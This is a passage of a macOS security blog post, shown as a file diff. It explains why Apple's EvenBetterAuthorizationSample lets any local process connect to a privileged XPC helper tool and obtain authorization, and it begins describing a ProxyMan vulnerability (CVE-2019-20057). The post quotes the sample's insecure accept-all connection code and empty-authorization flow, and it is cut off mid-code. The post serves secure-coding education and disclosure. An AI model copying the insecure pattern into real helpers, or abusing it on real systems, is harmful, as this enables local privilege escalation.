@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Csaba Fitzl">
+    
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Secure coding XPC services - Part 1 - Why EvenBetterAuthorization is not enough?"/>
+<meta name="twitter:description" content="This is the first part of a blog post series I plan about PrivilegedHelperTools that exists on macOS systems. I recently took a look on a couple of these tools, and found that it&rsquo;s very easy to make the code insecure, as there are many small pieces to it, and if one is done wrong, the helper tool will be open to abuse by anyone having a foothold on the system."/>
+
+    <meta property="og:title" content="Secure coding XPC services - Part 1 - Why EvenBetterAuthorization is not enough?" />
+<meta property="og:description" content="This is the first part of a blog post series I plan about PrivilegedHelperTools that exists on macOS systems. I recently took a look on a couple of these tools, and found that it&rsquo;s very easy to make the code insecure, as there are many small pieces to it, and if one is done wrong, the helper tool will be open to abuse by anyone having a foothold on the system." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theevilbit.github.io/posts/secure_coding_xpc_part1/" />
+<meta property="article:published_time" content="2020-01-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-01-12T00:00:00+00:00" />
+
+
+    
+      <base href="https://theevilbit.github.io/posts/secure_coding_xpc_part1/">
+    
+    <title>
+  Secure coding XPC services - Part 1 - Why EvenBetterAuthorization is not enough? · theevilbit blog
+</title>
+
+    
+      <link rel="canonical" href="https://theevilbit.github.io/posts/secure_coding_xpc_part1/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.71.0" />
+  </head>
+
+  <body class=" ">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://theevilbit.github.io/">
+      theevilbit blog
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/categories/">Categories</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/posts/">Posts</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/tags/">Tags</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Secure coding XPC services - Part 1 - Why EvenBetterAuthorization is not enough?</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-01-12T00:00:00Z'>
+                January 12, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              13 minutes read
+            </span>
+          </div>
+          <div class="categories">
+  <i class="fas fa-folder"></i>
+    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>
+
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://theevilbit.github.io/tags/macos/">macos</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/lpe/">lpe</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/privilegedhelpertools/">privilegedhelpertools</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/xpc/">xpc</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        <p>This is the first part of a blog post series I plan about PrivilegedHelperTools that exists on macOS systems. I recently took a look on a couple of these tools, and found that it&rsquo;s very easy to make the code insecure, as there are many small pieces to it, and if one is done wrong, the helper tool will be open to abuse by anyone having a foothold on the system. Depending on the application this might be limited to certain privileged actions (setting system configurations, mounting, etc&hellip;), and in some cases it&rsquo;s more broad, and thus a full privilege escalation can be performed. Ideally only the real client application should be able to talk to the helper tool, and all other connections should be refused.</p>
+<p>The next parts will come only later, because the fix for the examples I want to show will come only later this year.</p>
+<h2 id="what-are-privilegedhelpertools">What are PrivilegedHelperTools?</h2>
+<p>For those who are not familiar with the concept here is a very short overview. Essentially this is part of a factored application, that is designed to perform certain privileged actions (typically would require root access) on behalf of the application. The idea behind this is that your application can be run as normal user, and if something privileged has to be done, it can turn to this tool. The helper tool will run as a different process, under different privileges and different sandbox rules. This is good from many perspectives, it will limit the possibilities of a potential privileged escalation compared to the case if the entire application is running as root, and it will also make the application more reliable, as if there is a crash in this tool, the main application can still run, and the helper can be restarted safely. Communication between the main application is happening over XPC, which under the hood uses Mach services. An XPC is an interprocess communication in macOS, and recently it became the standard for any of that. No one knows what XPC stands for. I will cover some XPC related stuff as we go into the examples.</p>
+<h2 id="apples-evenbetterauthorizationsample">Apple&rsquo;s EvenBetterAuthorizationSample</h2>
+<p>I highly recommend reading through Apple&rsquo;s authorisation concepts and their EvenBetterAuthorizationSample code for the following part, here:</p>
+<p><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/authorization_concepts/01introduction/introduction.html#//apple_ref/doc/uid/TP30000995-CH204-TP1">Introduction to Authorization Services Programming Guide</a></p>
+<p><a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html">EvenBetterAuthorizationSample</a></p>
+<p>I will cover some parts of that very high level, and mainly why is it not sufficient for a privileged helper tool. This will be done through going through some parts of the code. The idea behind this part is to show why this sample, which is widely used doesn&rsquo;t authenticate/authorize the client properly. I&rsquo;m not a developer, so if I made an error here understanding the code let me know. With that let&rsquo;s see how we establish a connection.</p>
+<p>On the main app, we simply create a new XPC connection:
+<a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/App_Sandboxed_AppDelegate_m.html#//apple_ref/doc/uid/DTS40013768-App_Sandboxed_AppDelegate_m-DontLinkElementID_6">App-Sandboxed/AppDelegate.m</a></p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">connectToHelperToolEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">endpoint</span>
+    <span style="color:#09f;font-style:italic">// Ensures that we&#39;re connected to our helper tool.
+</span><span style="color:#09f;font-style:italic"></span>{
+    assert([NSThread isMainThread]);
+    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#366">self</span>.helperToolConnection <span style="color:#555">==</span> <span style="color:#366">nil</span>) {
+        <span style="color:#366">self</span>.helperToolConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithListenerEndpoint</span>:endpoint];
+        <span style="color:#366">self</span>.helperToolConnection.remoteObjectInterface <span style="color:#555">=</span> [NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(HelperToolProtocol)];
+        <span style="color:#099">#pragma clang diagnostic push
+</span><span style="color:#099"></span>        <span style="color:#099">#pragma clang diagnostic ignored &#34;-Warc-retain-cycles&#34;
+</span><span style="color:#099"></span>        <span style="color:#366">self</span>.helperToolConnection.invalidationHandler <span style="color:#555">=</span> <span style="color:#555">^</span>{
+            <span style="color:#366">self</span>.helperToolConnection.invalidationHandler <span style="color:#555">=</span> <span style="color:#366">nil</span>;
+            [[NSOperationQueue mainQueue] <span style="color:#99f">addOperationWithBlock</span>:<span style="color:#555">^</span>{
+                <span style="color:#366">self</span>.helperToolConnection <span style="color:#555">=</span> <span style="color:#366">nil</span>;
+                [<span style="color:#366">self</span> <span style="color:#99f">logText</span>:<span style="color:#c30">@&#34;connection invalidated</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>];
+            }];
+        };
+        <span style="color:#099">#pragma clang diagnostic pop
+</span><span style="color:#099"></span>        [<span style="color:#366">self</span>.helperToolConnection resume];
+    }
+}
+</code></pre></div><p>On the helper tool side we simple accept it (going forward a bit this is the function that I will talk about later many times, this is where the client verification will need to happen):</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#c0f">listener:</span>(NSXPCListener <span style="color:#555">*</span>)<span style="color:#033">listener</span> <span style="color:#c0f">shouldAcceptNewConnection:</span>(NSXPCConnection <span style="color:#555">*</span>)<span style="color:#033">newConnection</span>
+{
+    assert(listener <span style="color:#555">==</span> <span style="color:#366">self</span>.listener);
+    assert(newConnection <span style="color:#555">!=</span> <span style="color:#366">nil</span>);
+    newConnection.exportedInterface <span style="color:#555">=</span> [NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(HelperToolProtocol)];
+    newConnection.exportedObject <span style="color:#555">=</span> <span style="color:#366">self</span>;
+    [newConnection resume];
+    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">YES</span>;
+}
+</code></pre></div><p>This is pretty standard code, and based on that we can see that any client application will establish an XPC connection to the helper tool, as it accepts everything. OK, but we have this <code>Authorization</code> thing, will that help? Obviously no, this is why I write this, but let&rsquo;s see why.</p>
+<p><a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/App_Sandboxed_AppDelegate_m.html#//apple_ref/doc/uid/DTS40013768-App_Sandboxed_AppDelegate_m-DontLinkElementID_6">App-Sandboxed/AppDelegate.m</a></p>
+<p>First it will setup an empty authorisation reference and make an external form for it, as that is need to pass authorisation information between two distinct processes (the helper tool and the main app). Normally this should succeed, again, you didn&rsquo;t really asked for any rights here.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">AuthorizationExternalForm   extForm;
+(...) 
+err <span style="color:#555">=</span> AuthorizationCreate(<span style="color:#366">NULL</span>, <span style="color:#366">NULL</span>, <span style="color:#f60">0</span>, <span style="color:#555">&amp;</span><span style="color:#366">self</span><span style="color:#555">-&gt;</span>_authRef);
+<span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">==</span> errAuthorizationSuccess) {
+    err <span style="color:#555">=</span> AuthorizationMakeExternalForm(<span style="color:#366">self</span><span style="color:#555">-&gt;</span>_authRef, <span style="color:#555">&amp;</span>extForm);
+}
+(...)
+</code></pre></div><p>Moving on it will call <code>setupAuthorizationRights</code></p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#366">self</span><span style="color:#555">-&gt;</span>_authRef) {
+        [<span style="color:#366">self</span> connectToXPCService];
+        [[<span style="color:#366">self</span>.xpcServiceConnection remoteObjectProxy] setupAuthorizationRights];
+    }
+</code></pre></div><p>This function can be found in the application&rsquo;s XPC service, which is a regular XPC service, not to be mixed with the PrivilegedHelperTool. <a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/App_Sandboxed_XPCService_XPCService_m.html#//apple_ref/doc/uid/DTS40013768-App_Sandboxed_XPCService_XPCService_m-DontLinkElementID_8">App-Sandboxed/XPCService/XPCService.m</a></p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setupAuthorizationRights</span>
+    <span style="color:#09f;font-style:italic">// Part of XPCServiceProtocol.  Called by the app at startup time to set up our 
+</span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// authorization rights in the authorization database.
+</span><span style="color:#09f;font-style:italic"></span>{
+    [Common <span style="color:#99f">setupAuthorizationRights</span>:<span style="color:#366">self</span><span style="color:#555">-&gt;</span>_authRef];
+}
+</code></pre></div><p>This will call the function from <a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/Common_Common_m.html#//apple_ref/doc/uid/DTS40013768-Common_Common_m-DontLinkElementID_13">Common/Common.m</a>. I think this can be very confusing for first read, and honestly I totally misunderstood it for the first time. The <code>enumerateRightsUsingBlock</code> will iterate over specific authorisation entries defined in the application. Normally these are the authorisation rights that an application want to setup in the authorisation database. I will shortcut here, and won&rsquo;t show how that works, but I encourage everyone to read the links I provided in the beginning.
+So while iterating over them, we will call <a href="https://developer.apple.com/documentation/security/1397961-authorizationrightget?language=objc">AuthorizationRightGet - Security | Apple Developer Documentation</a>. This function will check if an entry is already in the database or not. Note that it doesn&rsquo;t need the <code>authRef</code>, as the database is world readable. The <code>AuthorizationRightSet</code> part is not so important for us, because if the application is already installed the entry will be in the database.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">+ (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setupAuthorizationRights:</span>(AuthorizationRef)<span style="color:#033">authRef</span>
+    <span style="color:#09f;font-style:italic">// See comment in header.
+</span><span style="color:#09f;font-style:italic"></span>{
+    assert(authRef <span style="color:#555">!=</span> <span style="color:#366">NULL</span>);
+    [Common <span style="color:#99f">enumerateRightsUsingBlock</span>:<span style="color:#555">^</span>(NSString <span style="color:#555">*</span> authRightName, <span style="color:#078;font-weight:bold">id</span> authRightDefault, NSString <span style="color:#555">*</span> authRightDesc) {
+        OSStatus    blockErr;
+        <span style="color:#09f;font-style:italic">// First get the right.  If we get back errAuthorizationDenied that means there&#39;s 
+</span><span style="color:#09f;font-style:italic"></span>        <span style="color:#09f;font-style:italic">// no current definition, so we add our default one.
+</span><span style="color:#09f;font-style:italic"></span>        blockErr <span style="color:#555">=</span> AuthorizationRightGet([authRightName UTF8String], <span style="color:#366">NULL</span>);
+        <span style="color:#069;font-weight:bold">if</span> (blockErr <span style="color:#555">==</span> errAuthorizationDenied) {
+            blockErr <span style="color:#555">=</span> AuthorizationRightSet(
+                authRef,                                    <span style="color:#09f;font-style:italic">// authRef
+</span><span style="color:#09f;font-style:italic"></span>                [authRightName UTF8String],                 <span style="color:#09f;font-style:italic">// rightName
+</span><span style="color:#09f;font-style:italic"></span>                (<span style="color:#069;font-weight:bold">__bridge</span> CFTypeRef) authRightDefault,      <span style="color:#09f;font-style:italic">// rightDefinition
+</span><span style="color:#09f;font-style:italic"></span>                (<span style="color:#069;font-weight:bold">__bridge</span> CFStringRef) authRightDesc,       <span style="color:#09f;font-style:italic">// descriptionKey
+</span><span style="color:#09f;font-style:italic"></span>                <span style="color:#366">NULL</span>,                                       <span style="color:#09f;font-style:italic">// bundle (NULL implies main bundle)
+</span><span style="color:#09f;font-style:italic"></span>                CFSTR(<span style="color:#c30">&#34;Common&#34;</span>)                             <span style="color:#09f;font-style:italic">// localeTableName
+</span><span style="color:#09f;font-style:italic"></span>            );
+            assert(blockErr <span style="color:#555">==</span> errAuthorizationSuccess);
+        } <span style="color:#069;font-weight:bold">else</span> { 
+            <span style="color:#09f;font-style:italic">// A right already exists (err == noErr) or any other error occurs, we 
+</span><span style="color:#09f;font-style:italic"></span>            <span style="color:#09f;font-style:italic">// assume that it has been set up in advance by the system administrator or
+</span><span style="color:#09f;font-style:italic"></span>            <span style="color:#09f;font-style:italic">// this is the second time we&#39;ve run.  Either way, there&#39;s nothing more for 
+</span><span style="color:#09f;font-style:italic"></span>            <span style="color:#09f;font-style:italic">// us to do.
+</span><span style="color:#09f;font-style:italic"></span>        }
+    }];
+}
+</code></pre></div><p>Now that is done, our authorisation reference and external form is ready. Note that what happened is only setting up an EMPTY authorisation, without <strong>any</strong> rights! Anyone can do this.</p>
+<p>Let&rsquo;s see what happens when we call one of the functions of the helper tool. Let&rsquo;s take <code>writeLicenseKey</code> for example: <a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/HelperTool_HelperTool_m.html#//apple_ref/doc/uid/DTS40013768-HelperTool_HelperTool_m-DontLinkElementID_15">HelperTool/HelperTool.m</a>. It will call <code>checkAuthorization</code></p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">writeLicenseKey:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">licenseKey</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">authData</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span>(<span style="color:#555">^</span>)(NSError <span style="color:#555">*</span> error))<span style="color:#033">reply</span>
+    <span style="color:#09f;font-style:italic">// Part of the HelperToolProtocol.  Saves the license key to the defaults database.
+</span><span style="color:#09f;font-style:italic"></span>{
+    NSError <span style="color:#555">*</span>   error;
+    
+    error <span style="color:#555">=</span> <span style="color:#366">nil</span>;
+    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#555">!</span> [<span style="color:#366">self</span> <span style="color:#99f">isValidLicenseKey</span>:licenseKey] ) {
+        error <span style="color:#555">=</span> [NSError <span style="color:#99f">errorWithDomain</span>:NSOSStatusErrorDomain <span style="color:#99f">code</span>:paramErr <span style="color:#99f">userInfo</span>:<span style="color:#366">nil</span>];
+    }
+    <span style="color:#069;font-weight:bold">if</span> (error <span style="color:#555">==</span> <span style="color:#366">nil</span>) {
+        error <span style="color:#555">=</span> [<span style="color:#366">self</span> <span style="color:#99f">checkAuthorization</span>:authData <span style="color:#99f">command</span>:_cmd];
+    }
+    <span style="color:#069;font-weight:bold">if</span> (error <span style="color:#555">==</span> <span style="color:#366">nil</span>) {
+        [[NSUserDefaults standardUserDefaults] <span style="color:#99f">setObject</span>:licenseKey <span style="color:#99f">forKey</span>:kLicenseKeyDefaultsKey];
+    }
+ 
+    reply(error);
+}
+</code></pre></div><p><code>checkAuthoriation</code> will first verify if the AuthorizationExternalForm is valid or not, again no check for rights, and then create an AuthorizationRefernce from it. Then setup an empty authorisation right set, and will copy the required right name into it at <code>authorizationRightForCommand</code>.
+The important part happens at the <code>AuthorizationCopyRights</code>, because this is the point where the actual authorisation happens! This is important because what we see here is that the HelperTool will be authorized and not the actual client. The flags are set that if needed the helper tool can interact with the user (ask for password), but it doesn&rsquo;t have to.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (NSError <span style="color:#555">*</span>)<span style="color:#c0f">checkAuthorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">authData</span> <span style="color:#c0f">command:</span>(<span style="color:#078;font-weight:bold">SEL</span>)<span style="color:#033">command</span>
+    <span style="color:#09f;font-style:italic">// Check that the client denoted by authData is allowed to run the specified command. 
+</span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// authData is expected to be an NSData with an AuthorizationExternalForm embedded inside.
+</span><span style="color:#09f;font-style:italic"></span>{
+    <span style="color:#099">#pragma unused(authData)
+</span><span style="color:#099"></span>    NSError <span style="color:#555">*</span>                   error;
+    OSStatus                    err;
+    OSStatus                    junk;
+    AuthorizationRef            authRef;
+ 
+    assert(command <span style="color:#555">!=</span> <span style="color:#366">nil</span>);
+    authRef <span style="color:#555">=</span> <span style="color:#366">NULL</span>; 
+    <span style="color:#09f;font-style:italic">// First check that authData looks reasonable.    
+</span><span style="color:#09f;font-style:italic"></span>    error <span style="color:#555">=</span> <span style="color:#366">nil</span>;
+    <span style="color:#069;font-weight:bold">if</span> ( (authData <span style="color:#555">==</span> <span style="color:#366">nil</span>) <span style="color:#555">||</span> ([authData length] <span style="color:#555">!=</span> <span style="color:#069;font-weight:bold">sizeof</span>(AuthorizationExternalForm)) ) {
+        error <span style="color:#555">=</span> [NSError <span style="color:#99f">errorWithDomain</span>:NSOSStatusErrorDomain <span style="color:#99f">code</span>:paramErr <span style="color:#99f">userInfo</span>:<span style="color:#366">nil</span>];
+    }
+    <span style="color:#09f;font-style:italic">// Create an authorization ref from that the external form data contained within.
+</span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">if</span> (error <span style="color:#555">==</span> <span style="color:#366">nil</span>) {
+        err <span style="color:#555">=</span> AuthorizationCreateFromExternalForm([authData bytes], <span style="color:#555">&amp;</span>authRef);
+        <span style="color:#09f;font-style:italic">// Authorize the right associated with the command.
+</span><span style="color:#09f;font-style:italic"></span>        <span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">==</span> errAuthorizationSuccess) {
+            AuthorizationItem   oneRight <span style="color:#555">=</span> { <span style="color:#366">NULL</span>, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>, <span style="color:#f60">0</span> };
+            AuthorizationRights rights   <span style="color:#555">=</span> { <span style="color:#f60">1</span>, <span style="color:#555">&amp;</span>oneRight };
+ 
+            oneRight.name <span style="color:#555">=</span> [[Common <span style="color:#99f">authorizationRightForCommand</span>:command] UTF8String];
+            assert(oneRight.name <span style="color:#555">!=</span> <span style="color:#366">NULL</span>);
+            
+            err <span style="color:#555">=</span> AuthorizationCopyRights(
+                authRef,
+                <span style="color:#555">&amp;</span>rights,
+                <span style="color:#366">NULL</span>,
+                kAuthorizationFlagExtendRights <span style="color:#555">|</span> kAuthorizationFlagInteractionAllowed,
+                <span style="color:#366">NULL</span>
+            );
+        }
+        <span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">!=</span> errAuthorizationSuccess) {
+            error <span style="color:#555">=</span> [NSError <span style="color:#99f">errorWithDomain</span>:NSOSStatusErrorDomain <span style="color:#99f">code</span>:err <span style="color:#99f">userInfo</span>:<span style="color:#366">nil</span>];
+        }
+    }
+ 
+    <span style="color:#069;font-weight:bold">if</span> (authRef <span style="color:#555">!=</span> <span style="color:#366">NULL</span>) {
+        junk <span style="color:#555">=</span> AuthorizationFree(authRef, <span style="color:#f60">0</span>);
+        assert(junk <span style="color:#555">==</span> errAuthorizationSuccess);
+    }
+ 
+    <span style="color:#069;font-weight:bold">return</span> error;
+}
+</code></pre></div><p>Let&rsquo;s go back to the authorisation rights that will be entered into the authorisation database, because that will define if a user has to authenticate or not. This can be found in <a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Listings/Common_Common_m.html#//apple_ref/doc/uid/DTS40013768-Common_Common_m-DontLinkElementID_13">Common/Common.m</a>. The important part is the <code>kCommandKeyAuthRightDefault</code>, if that is set to <code>kAuthorizationRuleClassAllow</code> it means that authorization will be granted if other criteria is met. If set to <code>kAuthorizationRuleAuthenticateAsAdmin</code> a popup will be displayed to the user. However this will come from the helper tool asking for authorisation and not the actual client, so a user will likely happily authenticate.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">sCommandInfo <span style="color:#555">=</span> @{
+    NSStringFromSelector(<span style="color:#069;font-weight:bold">@selector</span>(<span style="color:#99f">readLicenseKeyAuthorization</span>:<span style="color:#99f">withReply</span>:)) <span style="color:#555">:</span> @{
+        <span style="color:#99f">kCommandKeyAuthRightName</span>    : <span style="color:#c30">@&#34;com.example.apple-samplecode.EBAS.readLicenseKey&#34;</span>, 
+        <span style="color:#99f">kCommandKeyAuthRightDefault</span> : @kAuthorizationRuleClassAllow, 
+        <span style="color:#99f">kCommandKeyAuthRightDesc</span>    : NSLocalizedString(
+            <span style="color:#c30">@&#34;EBAS is trying to read its license key.&#34;</span>, 
+            <span style="color:#c30">@&#34;prompt shown when user is required to authorize to read the license key&#34;</span>
+        )
+    },
+    NSStringFromSelector(<span style="color:#069;font-weight:bold">@selector</span>(<span style="color:#99f">writeLicenseKey</span>:<span style="color:#99f">authorization</span>:<span style="color:#99f">withReply</span>:)) <span style="color:#555">:</span> @{
+        <span style="color:#99f">kCommandKeyAuthRightName</span>    : <span style="color:#c30">@&#34;com.example.apple-samplecode.EBAS.writeLicenseKey&#34;</span>, 
+        <span style="color:#99f">kCommandKeyAuthRightDefault</span> : @kAuthorizationRuleAuthenticateAsAdmin, 
+        <span style="color:#99f">kCommandKeyAuthRightDesc</span>    : NSLocalizedString(
+            <span style="color:#c30">@&#34;EBAS is trying to write its license key.&#34;</span>, 
+            <span style="color:#c30">@&#34;prompt shown when user is required to authorize to write the license key&#34;</span>
+        )
+    },
+    NSStringFromSelector(<span style="color:#069;font-weight:bold">@selector</span>(<span style="color:#99f">bindToLowNumberPortAuthorization</span>:<span style="color:#99f">withReply</span>:)) <span style="color:#555">:</span> @{
+        <span style="color:#99f">kCommandKeyAuthRightName</span>    : <span style="color:#c30">@&#34;com.example.apple-samplecode.EBAS.startWebService&#34;</span>, 
+        <span style="color:#99f">kCommandKeyAuthRightDefault</span> : @kAuthorizationRuleClassAllow, 
+        <span style="color:#99f">kCommandKeyAuthRightDesc</span>    : NSLocalizedString(
+            <span style="color:#c30">@&#34;EBAS is trying to start its web service.&#34;</span>, 
+            <span style="color:#c30">@&#34;prompt shown when user is required to authorize to start the web service&#34;</span>
+        )
+    }
+</code></pre></div><p>So to summarise, why this model is not sufficient:</p>
+<ol>
+<li>Any client can connect to the helper tool</li>
+<li>Any client can setup an empty authorisation reference, which can be passed to the tool</li>
+<li>If the authorisation rule specifies <code>kAuthorizationRuleClassAllow</code> it means that authorisation will be granted without any popups, but even if not, a popup from the helper tool can be misleading.</li>
+</ol>
+<p>After the detailed analysis of <code>EvenBetterAuthorizationSample</code> let&rsquo;s see a real world example.</p>
+<h2 id="proxyman-change-proxy-privileged-action-vulnerability-cve-2019-20057">ProxyMan change proxy privileged action vulnerability (CVE-2019-20057)</h2>
+<p>ProxyMan is a web debugging / proxy tool for macOS. Upon installation / first run, it installs a privileged helper tool, which is later used to change the proxy settings by the application. Changing proxy settings is a privileged action by default, and requires user authentication before doing that, with the use of the Helper tool the application can always change the proxy without doing constant user authentication. Normally the helper tool should only work with the main application, however due to incorrect coding any user can interact with it and change the proxy.</p>
+<p>Software URL: <a href="https://proxyman.io/">Proxyman - Modern and Delightful HTTP Debugging Proxy on macOS</a></p>
+<p>Kudos for the developer <a href="https://twitter.com/_nghiatran">Noah Tran (@_nghiatran)</a> as he fixed the issue in a couple of days.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>This application uses Apple&rsquo;s old developer guide (<a href="https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html#//apple_ref/doc/uid/DTS40013768-Intro-DontLinkElementID_2">EvenBetterAuthorizationSample</a>) . As we saw using this example means that when someone is connected we can either just get authorisation without any further prompts if the AuthRight is set to <code>@kAuthorizationRuleClassAllow</code>, which is the case most of the time, including this app. Even if it&rsquo;s set for prompting, we can still talk to the tool, but at least we will need to get the user&rsquo;s consent.</p>
+<p>It&rsquo;s clear that ProxyMan used Apple&rsquo;s sample code for implementation, we can see that for example by comparing Apple&rsquo;s source:</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">- (NSError <span style="color:#555">*</span>)<span style="color:#c0f">checkAuthorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">authData</span> <span style="color:#c0f">command:</span>(<span style="color:#078;font-weight:bold">SEL</span>)<span style="color:#033">command</span>
+    <span style="color:#09f;font-style:italic">// Check that the client denoted by authData is allowed to run the specified command. 
+</span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// authData is expected to be an NSData with an AuthorizationExternalForm embedded inside.
+</span><span style="color:#09f;font-style:italic"></span>{
+    <span style="color:#099">#pragma unused(authData)
+</span><span style="color:#099"></span>    NSError <span style="color:#555">*</span>                   error;
+    OSStatus                    err;
+    OSStatus                    junk;
+    AuthorizationRef            authRef;
+ 
+    assert(command <span style="color:#555">!=</span> <span style="color:#366">nil</span>);
+    authRef <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
+ 
+    <span style="color:#09f;font-style:italic">// First check that authData looks reasonable.
+</span><span style="color:#09f;font-style:italic"></span>    
+    error <span style="color:#555">=</span> <span style="color:#366">nil</span>;
+    <span style="color:#069;font-weight:bold">if</span> ( (authData <span style="color:#555">==</span> <span style="color:#366">nil</span>) <span style="color:#555">||</span> ([authData length] <span style="color:#555">!=</span> <span style="color:#069;font-weight:bold">sizeof</span>(AuthorizationExternalForm)) ) {
